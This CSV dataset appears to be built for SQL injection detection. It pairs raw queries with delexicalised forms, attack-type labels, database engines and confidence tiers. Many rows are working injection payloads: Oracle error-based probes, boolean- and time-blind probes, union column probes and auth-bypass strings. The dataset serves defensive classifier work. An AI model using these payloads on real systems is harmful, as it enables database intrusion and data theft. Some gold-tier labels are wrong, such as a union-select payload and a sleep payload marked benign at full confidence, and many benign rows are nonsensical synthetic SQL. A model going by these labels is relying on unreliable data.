payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"select * from users WHERE username = ""1"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and \'foju\' = \'foju""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-7199\' or \'qibr\' = \'qibr"" and username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
SELECT TOP 50 PERCENT * FROM pony SELECT * FROM women FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM huge,select top __INT__ __IDENT__ * from __IDENT__ select * from __IDENT__ fetch first __INT__ __IDENT__ rows __IDENT__ top __INT__ * from __IDENT__,benign,generic,1.0,False,original,gold
SELECT arrangement ( s ) FROM ocean FULL OUTER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ full outer join,benign,mysql,0.9,False,original,silver
delsa,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-2783%\' ) ) and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ - __INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"-4127%' union all select 9558,9558,9558#","- __INT__ % ' union all select __INT__ , __INT__ , __INT__",union_based,generic,0.7,True,original,bronze
SELECT * FROM tool WHERE NOT news = 'related',select * from __IDENT__ where not __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
-9556' ) where 2472 = 2472 or ( 2883 = 9968 ) *9968--,- __INT__ ) where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ - -,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1\' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True,original,silver
"SELECT * FROM vapor ORDER BY adjective, consider","select * from __IDENT__ order by __IDENT__ , __IDENT__",benign,generic,1.0,False,original,gold
woll@stockdefotos.bb,__IDENT__,benign,generic,0.9,False,original,silver
-2505' or 9323 = 9323#,- __INT__ or __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"-6095"" ) as hygc where 8142 = 8142 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ) - -,boolean_blind,generic,0.8,True,original,silver
SELECT COUNT ( won ) FROM stick,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )","__INT__ , ( select * from __IDENT__ ( __INT__ , __INT__ , case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) limit __INT__ )",boolean_blind,postgresql,0.7,True,original,bronze
"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-2733\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )",error_based,oracle,0.95,True,original,gold
83178933p,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM stuck WHERE gravity BETWEEN 10 AND 20,select * from __IDENT__ where __IDENT__ between __INT__ and __INT__,benign,generic,1.0,False,original,gold
"SELECT column_name ( s ) FROM break,widely","select __IDENT__ ( __IDENT__ ) from __IDENT__ , __IDENT__",benign,generic,1.0,False,original,gold
"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # urzg","__INT__ and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) # __IDENT__",time_blind,postgresql,0.7,True,original,bronze
"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ )",auth_bypass,generic,0.6,True,original,bronze
SELECT pleasant ( s ) FROM long SELECT such ( s ),select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT COUNT ( usID ) FROM blind,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-6244\' ) as szpd where 8445 = 8445 and username = ""-5880\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )",error_based,mssql,0.8,True,original,silver
"SELECT * FROM diameter WHERE most NOT IN ( 'forget', 'does', 'know' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False,original,gold
"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --","- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",boolean_blind,mysql,0.8,True,original,silver
"SELECT onceID AS ID, young AS modern FROM knife","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
cu2tre8a,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM forty WHERE nose BETWEEN substance09/01/1996are AND slow15/31/1996usual,select * from __IDENT__ where __IDENT__ between __IDENT__ / __INT__ / __IDENT__ and __IDENT__ / __INT__ / __IDENT__,benign,generic,1.0,False,original,gold
"1"" ) where 2602 = 2602 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ ) where __INT__ = __INT__ and __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",heavy_query,postgresql,0.9,True,original,silver
"-3498"" ) ) as xbvb where 2056 = 2056 union all select 2056,2056,2056,2056,2056,2056,2056--","- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( ( 6723 = 6723""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-6523"" and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-1254"" and ( ( ( \'sbey\' = \'sbey""","select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) or __IDENT__ = __STR__ and ( ( ( \ __STR__ = __IDENT__",error_based,oracle,0.9,True,original,silver
SELECT * FROM soil FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False,original,gold
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%"" = ""","select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ and __STR__ = """,heavy_query,mysql,0.85,True,original,silver
9.20248E+015,__IDENT__ + __INT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and ( \'tqjx\' = \'tqjx"" or username = ""1 ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) and __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ),boolean_blind,oracle,0.8,True,original,silver
",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",", ( select ( case when ( __IDENT__ = __IDENT__ ) then __INT__ else cast ( __INT__ as __IDENT__ ) / ( select __INT__ from dual ) end ) from dual ) , ( select ( case when ( __IDENT__ ) then __INT__ else cast ( __INT__ as __IDENT__ ) / ( select __INT__ from dual ) end ) from dual )",boolean_blind,oracle,0.9,True,original,silver
heicy,__IDENT__,benign,generic,0.9,False,original,silver
"-2434' ) ) ) union all select 5509,5509,5509,5509,5509,5509,5509--","- __INT__ ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
"(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)","( select ( case when ( __IDENT__ = __IDENT__ ) then __IDENT__ ( __STR__ , __IDENT__ ) else __IDENT__ end ) from dual ) ( select ( case when ( __IDENT__ ) then __IDENT__ ( __STR__ , __IDENT__ ) else __IDENT__ end ) from dual )",time_blind,oracle,0.9,True,original,silver
"1"" ) as evoq where 8193 = 8193 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) - -",heavy_query,sqlite,0.9,True,original,silver
SELECT * FROM ( SELECT highway FROM walk ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT * FROM or WHERE may = 'box' LIMIT 3,select * from or where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False,original,gold
"1"" ) as kslq where 8669 = 8669 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",time_blind,postgresql,0.7,True,original,bronze
zacaras,__IDENT__,benign,generic,0.9,False,original,silver
select ( case when ( 2294 = 3651 ) then 2294 else 2294* ( select 2294 from information_schema.character_sets ) end ) #,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) #,error_based,mysql,0.9,True,original,silver
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = ""","select like ( __STR__ , upper ( hex ( __IDENT__ ( __INT__ / __INT__ ) ) ) ) and ( ( ( __STR__ = """,time_blind,sqlite,0.7,True,original,bronze
SELECT * FROM ( SELECT bell FROM yes ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
pr3caz,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-1985 ) ) ) and \'nmdq\' like \'nmdq"" or username = ""-5863""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,auth_bypass,generic,0.5,True,original,bronze
"1'+ ( select dnxi where 5850 = 5850 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ + ( select __IDENT__ where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",time_blind,postgresql,0.7,True,original,bronze
"1 ) ) as xutu where 5811 = 5811 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) - -",time_blind,postgresql,0.7,True,original,bronze
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON ( wp_posts.ID = wp_postmeta.post_id ) WHERE ( post_type = 'page' AND post_status = 'publish' ) AND wp_postmeta.meta_key = '_wp_page_template' AND wp_postmeta.meta_value = 'template/template-compare.php' ORDER BY wp_posts.post_title ASC,select * from __IDENT__ left join __IDENT__ on ( __IDENT__ = __IDENT__ ) where ( __IDENT__ = __STR__ and __IDENT__ = __STR__ ) and __IDENT__ = __STR__ and __IDENT__ = __STR__ order by __IDENT__ asc,benign,mysql,0.9,False,original,silver
quintino,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'fnwx\' = \'fnwx"" or username = ""1\'",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__,error_based,oracle,0.95,True,original,gold
SELECT low ( s ) FROM money INNER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ inner join,benign,generic,1.0,False,original,gold
SELECT shelf ( s FROM attached RIGHT JOIN,select __IDENT__ ( __IDENT__ from __IDENT__ right join,benign,mysql,0.9,False,original,silver
"SELECT hall, origin, becomingFROM wear WHERE hat IS NOT NULL","select __IDENT__ , __IDENT__ , __IDENT__ __IDENT__ where __IDENT__ is not null",benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""1\' ) ) and username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1"" or username = ""-3733\' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) or __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",boolean_blind,oracle,0.8,True,original,silver
"select * from users WHERE username = ""1\' and username = ""-1549\' ) or username = ""-9644 ) ) and username = ""1"" and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) and __IDENT__ = __STR__ and ( ( \ __STR__ = __IDENT__,auth_bypass,generic,0.5,True,original,bronze
"1%"" ) ) and sleep ( 5 ) #","__INT__ % "" ) ) and sleep ( __INT__ ) #",benign,generic,1.0,False,original,gold
SELECT COUNT ( diagram ) FROM longer,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
